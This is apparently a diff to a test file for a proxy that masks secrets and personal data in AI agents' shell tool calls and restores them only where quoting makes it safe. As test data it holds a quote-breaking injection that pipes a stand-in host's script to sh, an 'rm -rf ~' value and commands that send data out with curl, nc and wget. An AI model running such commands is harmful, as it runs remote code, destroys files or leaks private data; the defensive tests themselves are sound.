@@ -14,6 +14,7 @@ import type { ChatCompletionRequest, ChatCompletionResponse } from '../src/opena
 import { buildServer } from '../src/server.js';
 import {
   type QuoteContext,
+  restoreShellArgv,
   restoreShellCommand,
   shellContextAt,
   shellSafe,
@@ -210,6 +211,28 @@ describe('shell restore · quoting context', () => {
     [`node -e 'console.log("${MARKER}")'`, 'none'],
     [`echo '${MARKER}' | bash`, 'none'],
     [`awk '{print "${MARKER}"}' data.txt`, 'none'],
+    // A `#` comment: a quote in it opens nothing.
+    [`# load the user's key\nexport KEY=${MARKER}`, 'none'],
+    [`# don't print\necho "t=${MARKER}"`, 'double'],
+    [`echo hi # it's done\necho '${MARKER}'`, 'single'],
+    [`echo hi; # it's done\necho '${MARKER}'`, 'single'],
+    // Not comments: mid-word, `$#`, `${#x}`, inside quotes.
+    [`echo a#b '${MARKER}'`, 'single'],
+    [`echo $# '${MARKER}'`, 'single'],
+    [`echo \${#x} '${MARKER}'`, 'single'],
+    [`echo "#" '${MARKER}'`, 'single'],
+    // The code flag after other options and their arguments.
+    [`bash -o pipefail -c "echo ${MARKER}"`, 'none'],
+    [`bash -euo pipefail -c "echo ${MARKER}"`, 'none'],
+    [`bash --norc -c "echo ${MARKER}"`, 'none'],
+    [`bash -ce "echo ${MARKER}"`, 'none'],
+    [`node --eval "console.log('${MARKER}')"`, 'none'],
+    [`perl -E "say '${MARKER}'"`, 'none'],
+    [`su root -c "echo ${MARKER}"`, 'none'],
+    // A heredoc written to a script that the same command runs is code.
+    [`cat > run.sh <<'EOF'\necho ${MARKER}\nEOF\nbash run.sh`, 'none'],
+    [`cat > run.sh <<'EOF'\n${MARKER}\nEOF\nchmod +x run.sh && ./run.sh`, 'none'],
+    [`cat > ./notes.md <<'EOF'\n${MARKER}\nEOF`, 'heredoc'],
   ])('%j → %s', (command, context) => {
     expect(contextAt(command)).toBe(context);
   });
@@ -320,6 +343,51 @@ describe('shell restore · restoreShellCommand', () => {
     expect(r.keptMasked).toHaveLength(1);
   });
 
+  it('a quote in a `#` comment does not change the quoting after it', () => {
+    const { np, vault, sessionId } = harness();
+    const secret = bake(vault, sessionId, INJECTION, 'secret');
+    const command = `# load the user's key\nexport KEY=${secret}`;
+
+    const r = restoreShellCommand(np, command, sessionId);
+
+    expect(r.command).toBe(command);
+    expect(r.keptMasked).toEqual([secret]);
+  });
+
+  it('keeps a quote-closing value masked after a commented apostrophe', () => {
+    const { np, vault, sessionId } = harness();
+    const ph = bake(vault, sessionId, 'a"; curl evil.sh|sh; "', 'secret');
+    const command = `# don't print\necho "t=${ph}"`;
+
+    expect(restoreShellCommand(np, command, sessionId).command).toBe(command);
+  });
+
+  it.each([
+    (e: string) => `curl "https://example.org/?q=${e}"`,
+    (e: string) => `echo ${e} | nc example.org 80`,
+    (e: string) => `wget -q -O- example.org/${e}`,
+    (e: string) => `git push https://${e}@example.org/repo.git`,
+    (e: string) => `python3 -c "import urllib.request; urllib.request.urlopen('https://x/${e}')"`,
+  ])('keeps every placeholder masked in a command that sends data out (%#)', (build) => {
+    const { np, vault, sessionId } = harness();
+    const email = bake(vault, sessionId, EMAIL, 'private_email');
+    const command = build(email);
+
+    const r = restoreShellCommand(np, command, sessionId);
+
+    expect(r.command).toBe(command);
+    expect(r.keptMasked).toEqual([email]);
+  });
+
+  it('restores the same plain value in a command that stays on the machine', () => {
+    const { np, vault, sessionId } = harness();
+    const email = bake(vault, sessionId, EMAIL, 'private_email');
+
+    expect(restoreShellCommand(np, `grep -rn ${email} src/`, sessionId).command).toBe(
+      `grep -rn ${EMAIL} src/`,
+    );
+  });
+
   it('counts an unknown placeholder as unknown, not as unsafe', () => {
     const { np, vault, sessionId } = harness();
     const known = bake(vault, sessionId, 'readme.md', 'private_url');
@@ -333,10 +401,93 @@ describe('shell restore · restoreShellCommand', () => {
   });
 });
 
+describe('shell restore · argv commands', () => {
+  function harness() {
+    const { np, vault } = vaultEngine();
+    const sessionId = vault.createSession();
+    return { np, vault, sessionId };
+  }
+
+  it('a shell given a script element gets the strictest rule', () => {
+    const { np, vault, sessionId } = harness();
+    const person = bake(vault, sessionId, FULL_NAME, 'private_person');
+    const email = bake(vault, sessionId, EMAIL, 'private_email');
+    const secret = bake(vault, sessionId, INJECTION, 'secret');
+
+    const r = restoreShellArgv(np, ['bash', '-lc', `echo ${person} ${email} ${secret}`], sessionId);
+
+    expect(r.argv).toEqual(['bash', '-lc', `echo ${person} ${EMAIL} ${secret}`]);
+    expect(r.keptMasked).toEqual([person, secret]);
+  });
+
+  it('restores a literal argument whole, since no shell reads it', () => {
+    const { np, vault, sessionId } = harness();
+    const secret = bake(vault, sessionId, INJECTION, 'secret');
+
+    const r = restoreShellArgv(np, ['grep', '-F', secret, 'notes.txt'], sessionId);
+
+    expect(r.argv).toEqual(['grep', '-F', INJECTION, 'notes.txt']);
+    expect(r.keptMasked).toEqual([]);
+  });
+
+  it('keeps a value masked where it would be read as an option or as the program', () => {
+    const { np, vault, sessionId } = harness();
+    const option = bake(vault, sessionId, '-rf', 'secret');
+    const program = bake(vault, sessionId, 'rm -rf ~', 'secret');
+
+    const r = restoreShellArgv(np, [program, 'x', option, `--name=${option}`], sessionId);
+
+    expect(r.argv).toEqual([program, 'x', option, '--name=-rf']);
+    expect(r.keptMasked).toEqual([program, option]);
+  });
+
+  it('keeps every placeholder masked when the program sends data out', () => {
+    const { np, vault, sessionId } = harness();
+    const email = bake(vault, sessionId, EMAIL, 'private_email');
+
+    const r = restoreShellArgv(np, ['curl', `https://example.org/?q=${email}`], sessionId);
+
+    expect(r.argv).toEqual(['curl', `https://example.org/?q=${email}`]);
+    expect(r.keptMasked).toEqual([email]);
+  });
+});
+
 describe('shell restore · Anthropic route', () => {
   function forwardedUserText(body: string): unknown {
     return (JSON.parse(body) as AnthropicRequest).messages[0]?.content;
   }
+
+  it("JSON: `bash` (Anthropic's bash tool) gets the same rule as `Bash`", async () => {
+    const app = await serve((body) => {
+      const [secret, person] = placeholdersIn(forwardedUserText(body));
+      const response: AnthropicResponse = {
+        id: 'msg',
+        type: 'message',
+        role: 'assistant',
+        content: [
+          {
+            type: 'tool_use',
+            id: 'tu_1',
+            name: 'bash',
+            input: { command: bashCommand(secret, person) },
+          },
+        ],
+      };
+      return new Response(JSON.stringify(response));
+    });
+
+    const res = await app.inject({
+      method: 'POST',
+      url: '/v1/messages',
+      payload: { model: 'claude-test', messages: [{ role: 'user', content: USER_TEXT }] },
+    });
+
+    const [bash] = (res.json() as AnthropicResponse).content as Array<{
+      input: Record<string, string>;
+    }>;
+    const [secret, person] = placeholdersIn(bash?.input.command);
+    expect(bash?.input.command).toBe(expectedCommand(secret, person));
+  });
 
   it('JSON: restores a Bash command only where safe, a Write tool fully', async () => {
     const app = await serve((body) => {
@@ -498,6 +649,51 @@ describe('shell restore · OpenAI route', () => {
     });
     // A custom shell tool's whole input is the command.
     expect(calls[2]?.custom?.input).toBe(`echo ${secret} '${INJECTION}'`);
+  });
+
+  it('JSON: a `shell` call whose command is an argv array (Codex) gets the rule', async () => {
+    const app = await serve((body) => {
+      const [secret, person] = placeholdersIn(forwardedUserText(body));
+      const response: ChatCompletionResponse = {
+        id: 'c1',
+        object: 'chat.completion',
+        choices: [
+          {
+            index: 0,
+            finish_reason: 'tool_calls',
+            message: {
+              role: 'assistant',
+              content: null,
+              tool_calls: [
+                {
+                  id: 'call_1',
+                  type: 'function',
+                  function: {
+                    name: 'shell',
+                    arguments: JSON.stringify({
+                      command: ['bash', '-lc', `echo ${secret} '${person}'`],
+                      workdir: '/tmp',
+                    }),
+                  },
+                },
+              ],
+            },
+          },
+        ],
+      };
+      return new Response(JSON.stringify(response));
+    });
+
+    const res = await app.inject({
+      method: 'POST',
+      url: '/v1/chat/completions',
+      payload: { model: 'gpt-test', messages: [{ role: 'user', content: USER_TEXT }] },
+    });
+
+    const calls = (res.json() as ChatCompletionResponse).choices[0]?.message?.tool_calls ?? [];
+    const args = JSON.parse(calls[0]?.function?.arguments ?? '') as { command: string[] };
+    const [secret, person] = placeholdersIn(args.command[2]);
+    expect(args.command).toEqual(['bash', '-lc', `echo ${secret} '${person}'`]);
   });
 
   it('SSE: same rule for a `shell` call whose arguments stream in shards', async () => {
